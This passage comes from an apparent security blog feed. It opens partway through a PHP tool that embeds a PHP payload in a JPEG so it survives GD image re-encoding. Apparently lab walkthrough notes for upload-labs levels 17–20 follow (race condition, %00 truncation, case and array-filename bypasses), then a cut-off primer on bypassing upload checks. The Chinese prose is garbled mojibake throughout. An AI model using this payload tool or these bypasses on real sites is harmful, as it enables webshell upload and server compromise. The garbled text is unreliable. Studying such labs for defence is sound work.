class=&#34;hljs-variable&#34;&gt;$outStream&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;, &lt;span class=&#34;hljs-variable&#34;&gt;$startPos&lt;/span&gt;) . &lt;br&gt;                        &lt;span class=&#34;hljs-variable&#34;&gt;$miniPayload&lt;/span&gt; . &lt;br&gt;                        substr(&lt;br&gt;                            str_repeat(&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;\0&amp;quot;&lt;/span&gt;,&lt;span class=&#34;hljs-variable&#34;&gt;$nullbytePayloadSize&lt;/span&gt;).&lt;br&gt;                                substr(&lt;span class=&#34;hljs-variable&#34;&gt;$outStream&lt;/span&gt;, &lt;span class=&#34;hljs-variable&#34;&gt;$startPos&lt;/span&gt;, &lt;span class=&#34;hljs-variable&#34;&gt;$imageStreamSize&lt;/span&gt;),&lt;br&gt;                            &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;,&lt;br&gt;                            &lt;span class=&#34;hljs-variable&#34;&gt;$nullbytePayloadSize&lt;/span&gt;+&lt;span class=&#34;hljs-variable&#34;&gt;$imageStreamSize&lt;/span&gt;-&lt;span class=&#34;hljs-variable&#34;&gt;$extraBytes&lt;/span&gt;) . &lt;br&gt;                                substr(&lt;span class=&#34;hljs-variable&#34;&gt;$outStream&lt;/span&gt;, &lt;span class=&#34;hljs-variable&#34;&gt;$stopPos&lt;/span&gt;);&lt;br&gt;                &amp;#125; &lt;span class=&#34;hljs-keyword&#34;&gt;elseif&lt;/span&gt;(&lt;span class=&#34;hljs-variable&#34;&gt;$correctImage&lt;/span&gt;) &amp;#123;&lt;br&gt;                    &lt;span class=&#34;hljs-variable&#34;&gt;$outStream&lt;/span&gt; = &lt;span class=&#34;hljs-variable&#34;&gt;$outStreamTmp&lt;/span&gt;;&lt;br&gt;                &amp;#125; &lt;span class=&#34;hljs-keyword&#34;&gt;else&lt;/span&gt; &amp;#123;&lt;br&gt;                    &lt;span class=&#34;hljs-keyword&#34;&gt;break&lt;/span&gt;;&lt;br&gt;                &amp;#125;&lt;br&gt;                &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt;(checkImage(&lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;payload_&amp;#x27;&lt;/span&gt;.&lt;span class=&#34;hljs-variable&#34;&gt;$argv&lt;/span&gt;[&lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt;], &lt;span class=&#34;hljs-variable&#34;&gt;$outStream&lt;/span&gt;)) &amp;#123;&lt;br&gt;                    &lt;span class=&#34;hljs-keyword&#34;&gt;die&lt;/span&gt;(&lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;Success!&amp;#x27;&lt;/span&gt;);&lt;br&gt;                &amp;#125; &lt;span class=&#34;hljs-keyword&#34;&gt;else&lt;/span&gt; &amp;#123;&lt;br&gt;                    &lt;span class=&#34;hljs-keyword&#34;&gt;break&lt;/span&gt;;&lt;br&gt;                &amp;#125;&lt;br&gt;            &amp;#125;&lt;br&gt;        &amp;#125;&lt;br&gt;    &amp;#125;&lt;br&gt;    unlink(&lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;payload_&amp;#x27;&lt;/span&gt;.&lt;span class=&#34;hljs-variable&#34;&gt;$argv&lt;/span&gt;[&lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt;]);&lt;br&gt;    &lt;span class=&#34;hljs-keyword&#34;&gt;die&lt;/span&gt;(&lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;Something\&amp;#x27;s wrong&amp;#x27;&lt;/span&gt;);&lt;br&gt;&lt;br&gt;    &lt;span class=&#34;hljs-function&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;hljs-title&#34;&gt;checkImage&lt;/span&gt;(&lt;span class=&#34;hljs-params&#34;&gt;&lt;span class=&#34;hljs-variable&#34;&gt;$filename&lt;/span&gt;, &lt;span class=&#34;hljs-variable&#34;&gt;$data&lt;/span&gt;, &lt;span class=&#34;hljs-variable&#34;&gt;$unlink&lt;/span&gt; = &lt;span class=&#34;hljs-literal&#34;&gt;FALSE&lt;/span&gt;&lt;/span&gt;) &lt;/span&gt;&amp;#123;&lt;br&gt;        &lt;span class=&#34;hljs-keyword&#34;&gt;global&lt;/span&gt; &lt;span class=&#34;hljs-variable&#34;&gt;$correctImage&lt;/span&gt;;&lt;br&gt;        file_put_contents(&lt;span class=&#34;hljs-variable&#34;&gt;$filename&lt;/span&gt;, &lt;span class=&#34;hljs-variable&#34;&gt;$data&lt;/span&gt;);&lt;br&gt;        &lt;span class=&#34;hljs-variable&#34;&gt;$correctImage&lt;/span&gt; = &lt;span class=&#34;hljs-literal&#34;&gt;TRUE&lt;/span&gt;;&lt;br&gt;        imagecreatefromjpeg(&lt;span class=&#34;hljs-variable&#34;&gt;$filename&lt;/span&gt;);&lt;br&gt;        &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt;(&lt;span class=&#34;hljs-variable&#34;&gt;$unlink&lt;/span&gt;)&lt;br&gt;            unlink(&lt;span class=&#34;hljs-variable&#34;&gt;$filename&lt;/span&gt;);&lt;br&gt;        &lt;span class=&#34;hljs-keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;hljs-variable&#34;&gt;$correctImage&lt;/span&gt;;&lt;br&gt;    &amp;#125;&lt;br&gt;&lt;br&gt;    &lt;span class=&#34;hljs-function&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;hljs-title&#34;&gt;custom_error_handler&lt;/span&gt;(&lt;span class=&#34;hljs-params&#34;&gt;&lt;span class=&#34;hljs-variable&#34;&gt;$errno&lt;/span&gt;, &lt;span class=&#34;hljs-variable&#34;&gt;$errstr&lt;/span&gt;, &lt;span class=&#34;hljs-variable&#34;&gt;$errfile&lt;/span&gt;, &lt;span class=&#34;hljs-variable&#34;&gt;$errline&lt;/span&gt;&lt;/span&gt;) &lt;/span&gt;&amp;#123;&lt;br&gt;        &lt;span class=&#34;hljs-keyword&#34;&gt;global&lt;/span&gt; &lt;span class=&#34;hljs-variable&#34;&gt;$extraBytes&lt;/span&gt;, &lt;span class=&#34;hljs-variable&#34;&gt;$correctImage&lt;/span&gt;;&lt;br&gt;        &lt;span class=&#34;hljs-variable&#34;&gt;$correctImage&lt;/span&gt; = &lt;span class=&#34;hljs-literal&#34;&gt;FALSE&lt;/span&gt;;&lt;br&gt;        &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt;(preg_match(&lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;/(\d+) extraneous bytes before marker/&amp;#x27;&lt;/span&gt;, &lt;span class=&#34;hljs-variable&#34;&gt;$errstr&lt;/span&gt;, &lt;span class=&#34;hljs-variable&#34;&gt;$m&lt;/span&gt;)) &amp;#123;&lt;br&gt;            &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt;(&lt;span class=&#34;hljs-keyword&#34;&gt;isset&lt;/span&gt;(&lt;span class=&#34;hljs-variable&#34;&gt;$m&lt;/span&gt;[&lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt;])) &amp;#123;&lt;br&gt;                &lt;span class=&#34;hljs-variable&#34;&gt;$extraBytes&lt;/span&gt; = (&lt;span class=&#34;hljs-keyword&#34;&gt;int&lt;/span&gt;)&lt;span class=&#34;hljs-variable&#34;&gt;$m&lt;/span&gt;[&lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt;];&lt;br&gt;            &amp;#125;&lt;br&gt;        &amp;#125;&lt;br&gt;    &amp;#125;&lt;br&gt;&lt;br&gt;    &lt;span class=&#34;hljs-class&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;class&lt;/span&gt; &lt;span class=&#34;hljs-title&#34;&gt;DataInputStream&lt;/span&gt; &lt;/span&gt;&amp;#123;&lt;br&gt;        &lt;span class=&#34;hljs-keyword&#34;&gt;private&lt;/span&gt; &lt;span class=&#34;hljs-variable&#34;&gt;$binData&lt;/span&gt;;&lt;br&gt;        &lt;span class=&#34;hljs-keyword&#34;&gt;private&lt;/span&gt; &lt;span class=&#34;hljs-variable&#34;&gt;$order&lt;/span&gt;;&lt;br&gt;        &lt;span class=&#34;hljs-keyword&#34;&gt;private&lt;/span&gt; &lt;span class=&#34;hljs-variable&#34;&gt;$size&lt;/span&gt;;&lt;br&gt;&lt;br&gt;        &lt;span class=&#34;hljs-keyword&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;hljs-function&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;hljs-title&#34;&gt;__construct&lt;/span&gt;(&lt;span class=&#34;hljs-params&#34;&gt;&lt;span class=&#34;hljs-variable&#34;&gt;$filename&lt;/span&gt;, &lt;span class=&#34;hljs-variable&#34;&gt;$order&lt;/span&gt; = &lt;span class=&#34;hljs-literal&#34;&gt;false&lt;/span&gt;, &lt;span class=&#34;hljs-variable&#34;&gt;$fromString&lt;/span&gt; = &lt;span class=&#34;hljs-literal&#34;&gt;false&lt;/span&gt;&lt;/span&gt;) &lt;/span&gt;&amp;#123;&lt;br&gt;            &lt;span class=&#34;hljs-keyword&#34;&gt;$this&lt;/span&gt;-&amp;gt;binData = &lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;&amp;#x27;&lt;/span&gt;;&lt;br&gt;            &lt;span class=&#34;hljs-keyword&#34;&gt;$this&lt;/span&gt;-&amp;gt;order = &lt;span class=&#34;hljs-variable&#34;&gt;$order&lt;/span&gt;;&lt;br&gt;            &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt;(!&lt;span class=&#34;hljs-variable&#34;&gt;$fromString&lt;/span&gt;) &amp;#123;&lt;br&gt;                &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt;(!file_exists(&lt;span class=&#34;hljs-variable&#34;&gt;$filename&lt;/span&gt;) || !is_file(&lt;span class=&#34;hljs-variable&#34;&gt;$filename&lt;/span&gt;))&lt;br&gt;                    &lt;span class=&#34;hljs-keyword&#34;&gt;die&lt;/span&gt;(&lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;File not exists [&amp;#x27;&lt;/span&gt;.&lt;span class=&#34;hljs-variable&#34;&gt;$filename&lt;/span&gt;.&lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;]&amp;#x27;&lt;/span&gt;);&lt;br&gt;                &lt;span class=&#34;hljs-keyword&#34;&gt;$this&lt;/span&gt;-&amp;gt;binData = file_get_contents(&lt;span class=&#34;hljs-variable&#34;&gt;$filename&lt;/span&gt;);&lt;br&gt;            &amp;#125; &lt;span class=&#34;hljs-keyword&#34;&gt;else&lt;/span&gt; &amp;#123;&lt;br&gt;                &lt;span class=&#34;hljs-keyword&#34;&gt;$this&lt;/span&gt;-&amp;gt;binData = &lt;span class=&#34;hljs-variable&#34;&gt;$filename&lt;/span&gt;;&lt;br&gt;            &amp;#125;&lt;br&gt;            &lt;span class=&#34;hljs-keyword&#34;&gt;$this&lt;/span&gt;-&amp;gt;size = strlen(&lt;span class=&#34;hljs-keyword&#34;&gt;$this&lt;/span&gt;-&amp;gt;binData);&lt;br&gt;        &amp;#125;&lt;br&gt;&lt;br&gt;        &lt;span class=&#34;hljs-keyword&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;hljs-function&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;hljs-title&#34;&gt;seek&lt;/span&gt;(&lt;span class=&#34;hljs-params&#34;&gt;&lt;/span&gt;) &lt;/span&gt;&amp;#123;&lt;br&gt;            &lt;span class=&#34;hljs-keyword&#34;&gt;return&lt;/span&gt; (&lt;span class=&#34;hljs-keyword&#34;&gt;$this&lt;/span&gt;-&amp;gt;size - strlen(&lt;span class=&#34;hljs-keyword&#34;&gt;$this&lt;/span&gt;-&amp;gt;binData));&lt;br&gt;        &amp;#125;&lt;br&gt;&lt;br&gt;        &lt;span class=&#34;hljs-keyword&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;hljs-function&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;hljs-title&#34;&gt;skip&lt;/span&gt;(&lt;span class=&#34;hljs-params&#34;&gt;&lt;span class=&#34;hljs-variable&#34;&gt;$skip&lt;/span&gt;&lt;/span&gt;) &lt;/span&gt;&amp;#123;&lt;br&gt;            &lt;span class=&#34;hljs-keyword&#34;&gt;$this&lt;/span&gt;-&amp;gt;binData = substr(&lt;span class=&#34;hljs-keyword&#34;&gt;$this&lt;/span&gt;-&amp;gt;binData, &lt;span class=&#34;hljs-variable&#34;&gt;$skip&lt;/span&gt;);&lt;br&gt;        &amp;#125;&lt;br&gt;&lt;br&gt;        &lt;span class=&#34;hljs-keyword&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;hljs-function&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;hljs-title&#34;&gt;readByte&lt;/span&gt;(&lt;span class=&#34;hljs-params&#34;&gt;&lt;/span&gt;) &lt;/span&gt;&amp;#123;&lt;br&gt;            &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt;(&lt;span class=&#34;hljs-keyword&#34;&gt;$this&lt;/span&gt;-&amp;gt;eof()) &amp;#123;&lt;br&gt;                &lt;span class=&#34;hljs-keyword&#34;&gt;die&lt;/span&gt;(&lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;End Of File&amp;#x27;&lt;/span&gt;);&lt;br&gt;            &amp;#125;&lt;br&gt;            &lt;span class=&#34;hljs-variable&#34;&gt;$byte&lt;/span&gt; = substr(&lt;span class=&#34;hljs-keyword&#34;&gt;$this&lt;/span&gt;-&amp;gt;binData, &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt;);&lt;br&gt;            &lt;span class=&#34;hljs-keyword&#34;&gt;$this&lt;/span&gt;-&amp;gt;binData = substr(&lt;span class=&#34;hljs-keyword&#34;&gt;$this&lt;/span&gt;-&amp;gt;binData, &lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt;);&lt;br&gt;            &lt;span class=&#34;hljs-keyword&#34;&gt;return&lt;/span&gt; ord(&lt;span class=&#34;hljs-variable&#34;&gt;$byte&lt;/span&gt;);&lt;br&gt;        &amp;#125;&lt;br&gt;&lt;br&gt;        &lt;span class=&#34;hljs-keyword&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;hljs-function&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;hljs-title&#34;&gt;readShort&lt;/span&gt;(&lt;span class=&#34;hljs-params&#34;&gt;&lt;/span&gt;) &lt;/span&gt;&amp;#123;&lt;br&gt;            &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt;(strlen(&lt;span class=&#34;hljs-keyword&#34;&gt;$this&lt;/span&gt;-&amp;gt;binData) &amp;lt; &lt;span class=&#34;hljs-number&#34;&gt;2&lt;/span&gt;) &amp;#123;&lt;br&gt;                &lt;span class=&#34;hljs-keyword&#34;&gt;die&lt;/span&gt;(&lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;End Of File&amp;#x27;&lt;/span&gt;);&lt;br&gt;            &amp;#125;&lt;br&gt;            &lt;span class=&#34;hljs-variable&#34;&gt;$short&lt;/span&gt; = substr(&lt;span class=&#34;hljs-keyword&#34;&gt;$this&lt;/span&gt;-&amp;gt;binData, &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;2&lt;/span&gt;);&lt;br&gt;            &lt;span class=&#34;hljs-keyword&#34;&gt;$this&lt;/span&gt;-&amp;gt;binData = substr(&lt;span class=&#34;hljs-keyword&#34;&gt;$this&lt;/span&gt;-&amp;gt;binData, &lt;span class=&#34;hljs-number&#34;&gt;2&lt;/span&gt;);&lt;br&gt;            &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt;(&lt;span class=&#34;hljs-keyword&#34;&gt;$this&lt;/span&gt;-&amp;gt;order) &amp;#123;&lt;br&gt;                &lt;span class=&#34;hljs-variable&#34;&gt;$short&lt;/span&gt; = (ord(&lt;span class=&#34;hljs-variable&#34;&gt;$short&lt;/span&gt;[&lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt;]) &amp;lt;&amp;lt; &lt;span class=&#34;hljs-number&#34;&gt;8&lt;/span&gt;) + ord(&lt;span class=&#34;hljs-variable&#34;&gt;$short&lt;/span&gt;[&lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;]);&lt;br&gt;            &amp;#125; &lt;span class=&#34;hljs-keyword&#34;&gt;else&lt;/span&gt; &amp;#123;&lt;br&gt;                &lt;span class=&#34;hljs-variable&#34;&gt;$short&lt;/span&gt; = (ord(&lt;span class=&#34;hljs-variable&#34;&gt;$short&lt;/span&gt;[&lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;]) &amp;lt;&amp;lt; &lt;span class=&#34;hljs-number&#34;&gt;8&lt;/span&gt;) + ord(&lt;span class=&#34;hljs-variable&#34;&gt;$short&lt;/span&gt;[&lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt;]);&lt;br&gt;            &amp;#125;&lt;br&gt;            &lt;span class=&#34;hljs-keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;hljs-variable&#34;&gt;$short&lt;/span&gt;;&lt;br&gt;        &amp;#125;&lt;br&gt;&lt;br&gt;        &lt;span class=&#34;hljs-keyword&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;hljs-function&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;hljs-title&#34;&gt;eof&lt;/span&gt;(&lt;span class=&#34;hljs-params&#34;&gt;&lt;/span&gt;) &lt;/span&gt;&amp;#123;&lt;br&gt;            &lt;span class=&#34;hljs-keyword&#34;&gt;return&lt;/span&gt; !&lt;span class=&#34;hljs-keyword&#34;&gt;$this&lt;/span&gt;-&amp;gt;binData||(strlen(&lt;span class=&#34;hljs-keyword&#34;&gt;$this&lt;/span&gt;-&amp;gt;binData) === &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;);&lt;br&gt;        &amp;#125;&lt;br&gt;    &amp;#125;&lt;br&gt;&lt;span class=&#34;hljs-meta&#34;&gt;?&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;h1 id=&#34;Less-17&#34;&gt;&lt;a href=&#34;#Less-17&#34; class=&#34;headerlink&#34; title=&#34;Less-17&#34;&gt;&lt;/a&gt;Less-17&lt;/h1&gt;&lt;p&gt;è¿™ä¸€å…³è€ƒå¯Ÿæ¡ä»¶ç«äº‰ï¼Œçœ‹æºç å‘ç°æ˜¯å…ˆä¿å­˜ç„¶åå†åˆ¤æ–­æ˜¯å¦éœ€è¦åˆ é™¤ï¼Œä¹Ÿå°±æ˜¯å¯ä»¥ä¸€è¾¹ä¸æ–­å‘åŒ…ä¸Šä¼ ï¼Œä¸€è¾¹ä¸æ–­è¯·æ±‚æ‰§è¡Œã€‚ä¸Šä¼ ä¸€ä¸ªæ‰§è¡Œå°±ä¼šé¢å¤–ç”Ÿæˆæœ¨é©¬çš„æœ¨é©¬ï¼ŒæŠ“ä½åˆ¤æ–­æ˜¯å¦éœ€è¦åˆ é™¤çš„ä¸€å°æ®µæ—¶é—´æ¥å‘èµ·è¯·æ±‚ï¼Œè¾¾åˆ°ç›®çš„ã€‚æˆ‘è·‘äº†ä¸€ä¸‡æ¬¡æ‰æœ‰ä¸€æ¬¡è®¿é—®æˆåŠŸï¼Œè¿˜æ˜¯è¦é è¿æ°”ã€‚ã€‚ã€‚ã€‚&lt;/p&gt;
&lt;h1 id=&#34;Less-18&#34;&gt;&lt;a href=&#34;#Less-18&#34; class=&#34;headerlink&#34; title=&#34;Less-18&#34;&gt;&lt;/a&gt;Less-18&lt;/h1&gt;&lt;p&gt;åŒæ ·ä¹Ÿæ˜¯æ¡ä»¶ç«äº‰&lt;/p&gt;
&lt;h1 id=&#34;Less-19&#34;&gt;&lt;a href=&#34;#Less-19&#34; class=&#34;headerlink&#34; title=&#34;Less-19&#34;&gt;&lt;/a&gt;Less-19&lt;/h1&gt;&lt;p&gt;WPè¯´æ˜¯å¯ä»¥%00æˆªæ–­1.php%00.jpgæˆ–è€…ä¿å­˜åä¸º1.php/.    ä½†æ˜¯æˆ‘å‘ç°å¥½åƒå¯ä»¥å¤§å°å†™ç»•è¿‡ï¼Ÿè¯•äº†ä¸€ä¸‹æˆåŠŸäº†å˜»å˜»å˜»&lt;/p&gt;
&lt;h1 id=&#34;Less-20&#34;&gt;&lt;a href=&#34;#Less-20&#34; class=&#34;headerlink&#34; title=&#34;Less-20&#34;&gt;&lt;/a&gt;Less-20&lt;/h1&gt;&lt;p&gt;å®¡è®¡ä»£ç ï¼Œ1.æ£€æŸ¥MIMEç±»å‹ 2. æ£€æŸ¥æ–‡ä»¶åï¼Œå¦‚æœæ˜¯å­—ç¬¦ä¸²ï¼Œå°±ç›´æ¥é€šè¿‡.æ‰“æ•£ç„¶åå–å‡ºåç¼€ï¼Œå› æ­¤å¯ä»¥é€šè¿‡ä¸Šä¼ æ•°ç»„ç»•è¿‡å¤„ç†ï¼Œç„¶åä¸Šä¼ ä¸€ä¸ªæ•°é‡ä¸ºä¸‰çš„æ•°ç»„ï¼Œæœ€åä¸€ä¸ªå…ƒç´ æ”¾jpgï¼Œç¬¬ä¸€ä¸ªå…ƒç´ æ˜¯1.phpï¼Œä¸­é—´çš„å…ƒç´ ä¸ºç©ºï¼Œè¿™æ ·ç»•è¿‡åˆ¤æ–­æœ€åä¸€ä¸ªå…ƒç´ æ˜¯ä¸æ˜¯jpgï¼ŒåŒæ—¶æ‹¼æ¥å‡ºæ¥çš„æ–‡ä»¶åæ˜¯&lt;code&gt;1.php.&lt;/code&gt;ï¼Œè¾¾åˆ°æ•ˆæœã€‚&lt;/p&gt;
</content>
        <updated>2019-10-12T02:48:24.000Z</updated>
    </entry>
    <entry>
        <id>http://blog.m1n.me/2019/09/10/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/</id>
        <title>æ–‡ä»¶ä¸Šä¼ æ¼æ´</title>
        <link rel="alternate" href="http://blog.m1n.me/2019/09/10/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"/>
        <content type="html">&lt;h2 id=&#34;æ–‡ä»¶ä¸Šä¼ æ¼æ´ç®€ä»‹&#34;&gt;&lt;a href=&#34;#æ–‡ä»¶ä¸Šä¼ æ¼æ´ç®€ä»‹&#34; class=&#34;headerlink&#34; title=&#34;æ–‡ä»¶ä¸Šä¼ æ¼æ´ç®€ä»‹&#34;&gt;&lt;/a&gt;æ–‡ä»¶ä¸Šä¼ æ¼æ´ç®€ä»‹&lt;/h2&gt;&lt;p&gt;æ–‡ä»¶ä¸Šä¼ æ¼æ´æ˜¯webå®‰å…¨ä¸­ç»å¸¸é‡åˆ°çš„ä¸€ç§æ¼æ´å½¢å¼ï¼Œæ–‡ä»¶ä¸Šä¼ æ¼æ´å°±æ˜¯åˆ©ç”¨å¯ä»¥ä¸Šä¼ æ–‡ä»¶çš„åœ°æ–¹å°†æ¶æ„ä»£ç æˆ–æ–‡ä»¶æ¤å…¥åˆ°æœåŠ¡å™¨ä¸­ï¼Œå†é€šè¿‡URLå»è®¿é—®æ¥æ‰§è¡Œä»£ç ï¼Œä½†æ˜¯ç»å¸¸ä¼šé‡åˆ°å„ç§é™åˆ¶å’Œè¿‡æ»¤ï¼Œå› æ­¤å°±è¦å­¦ä¼šå„ç§å§¿åŠ¿æ¥ç»•è¿‡ã€‚&lt;/p&gt;
&lt;span id=&#34;more&#34;&gt;&lt;/span&gt;
&lt;h2 id=&#34;å¸¸è§çš„é™åˆ¶ä»¥åŠç»•è¿‡&#34;&gt;&lt;a href=&#34;#å¸¸è§çš„é™åˆ¶ä»¥åŠç»•è¿‡&#34; class=&#34;headerlink&#34; title=&#34;å¸¸è§çš„é™åˆ¶ä»¥åŠç»•è¿‡&#34;&gt;&lt;/a&gt;å¸¸è§çš„é™åˆ¶ä»¥åŠç»•è¿‡&lt;/h2&gt;&lt;h3 id=&#34;å®¢æˆ·ç«¯éªŒè¯ï¼ˆå‰ç«¯éªŒè¯&#34;&gt;&lt;a href=&#34;#å®¢æˆ·ç«¯éªŒè¯ï¼ˆå‰ç«¯éªŒè¯&#34; class=&#34;headerlink&#34; title=&#34;å®¢æˆ·ç«¯éªŒè¯ï¼ˆå‰ç«¯éªŒè¯)&#34;&gt;&lt;/a&gt;å®¢æˆ·ç«¯éªŒè¯ï¼ˆå‰ç«¯éªŒè¯)&lt;/h3&gt;&lt;h4 id=&#34;åŸç†&#34;&gt;&lt;a href=&#34;#åŸç†&#34; class=&#34;headerlink&#34; title=&#34;åŸç†&#34;&gt;&lt;/a&gt;åŸç†&lt;/h4&gt;&lt;p&gt;å°±æ˜¯é€šè¿‡å‰ç«¯ä»£ç æ¥æ£€æŸ¥ç”¨æˆ·æ‰€ä¸Šä¼ çš„æ–‡ä»¶çš„æ‰©å±•åï¼Œå¯¹äºæ”»å‡»è€…æ¥è¯´æ˜¯æå…¶å®¹æ˜“ç»•è¿‡çš„ï¼Œå› æ­¤æ›´å¤šæ˜¯ç”¨äºé˜²æ­¢ç”¨æˆ·é”™è¯¯ä¸Šä¼ æ–‡ä»¶ç±»å‹çš„æªæ–½ã€‚&lt;/p&gt;
&lt;h4 id=&#34;ç»•è¿‡&#34;&gt;&lt;a href=&#34;#ç»•è¿‡&#34; class=&#34;headerlink&#34; title=&#34;ç»•è¿‡&#34;&gt;&lt;/a&gt;ç»•è¿‡&lt;/h4&gt;&lt;ol&gt;
&lt;li&gt;å…ˆä¸Šä¼ ä¸€ä¸ª.gifæˆ–è€….JPGä¹‹ç±»çš„æœ¨é©¬ï¼Œçªç ´å‰ç«¯éªŒè¯åå†é€šè¿‡æŠ“åŒ…ä¿®æ”¹æ–‡ä»¶åç¼€åæ¥å®ç°ç»•è¿‡&lt;/li&gt;
&lt;li&gt;é€šè¿‡ç¦ç”¨æˆ–è€…åˆ é™¤JSæ¥å®ç°çªç ´&lt;h3 id=&#34;æœåŠ¡ç«¯éªŒè¯&#34;&gt;&lt;a href=&#34;#æœåŠ¡ç«¯éªŒè¯&#34; class=&#34;headerlink&#34; title=&#34;æœåŠ¡ç«¯éªŒè¯&#34;&gt;&lt;/a&gt;æœåŠ¡ç«¯éªŒè¯&lt;/h3&gt;&lt;h4 id=&#34;MIMEç±»å‹æ£€æµ‹&#34;&gt;&lt;a href=&#34;#MIMEç±»å‹æ£€æµ‹&#34; class=&#34;headerlink&#34; title=&#34;MIMEç±»å‹æ£€æµ‹&#34;&gt;&lt;/a&gt;MIMEç±»å‹æ£€æµ‹&lt;/h4&gt;&lt;h5 id=&#34;åŸç†-1&#34;&gt;&lt;a href=&#34;#åŸç†-1&#34; class=&#34;headerlink&#34; title=&#34;åŸç†&#34;&gt;&lt;/a&gt;åŸç†&lt;/h5&gt;æœåŠ¡ç«¯é€šè¿‡æ£€æµ‹MIMEæ¥é™åˆ¶æ–‡ä»¶ä¸Šä¼ çš„ç±»å‹ï¼Œå…¶ä»£ç å¯èƒ½å¦‚ä¸‹ï¼š&lt;br&gt;&lt;code&gt;$_FILES[&amp;#39;flie&amp;#39;][&amp;#39;type&amp;#39;] == &amp;#39;image/jpeg&amp;#39;&lt;/code&gt;&lt;h5 id=&#34;ç»•è¿‡-1&#34;&gt;&lt;a href=&#34;#ç»•è¿‡-1&#34; class=&#34;headerlink&#34; title=&#34;ç»•è¿‡&#34;&gt;&lt;/a&gt;ç»•è¿‡&lt;/h5&gt;é€šè¿‡æŠ“åŒ…ä¿®æ”¹Content-Type&lt;br&gt;&lt;img src=&#34;https://iminx-1258939911.cos.ap-chengdu.myqcloud.com/%E5%86%85%E5%AE%B9/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/1.jpg&#34; alt=&#34;1.png&#34;&gt;&lt;h4 id=&#34;æ£€æŸ¥æ–‡ä»¶å†…å®¹&#34;&gt;&lt;a href=&#34;#æ£€æŸ¥æ–‡ä»¶å†…å®¹&#34; class=&#34;headerlink&#34; title=&#34;æ£€æŸ¥æ–‡ä»¶å†…å®¹&#34;&gt;&lt;/a&gt;æ£€æŸ¥æ–‡ä»¶å†…å®¹&lt;/h4&gt;&lt;h5 id=&#34;åŸç†-2&#34;&gt;&lt;a href=&#34;#åŸç†-2&#34; class=&#34;headerlink&#34; title=&#34;åŸç†&#34;&gt;&lt;/a&gt;åŸç†&lt;/h5&gt;æ£€æŸ¥æ–‡ä»¶å†…å®¹æ˜¯å¦åŒ…å«â€œ&amp;lt;? â€ã€â€œ&amp;lt;?= â€ä¹‹ç±»çš„å…³é”®å­—&lt;h5 id=&#34;ç»•è¿‡-2&#34;&gt;&lt;a href=&#34;#ç»•è¿‡-2&#34; class=&#34;headerlink&#34; 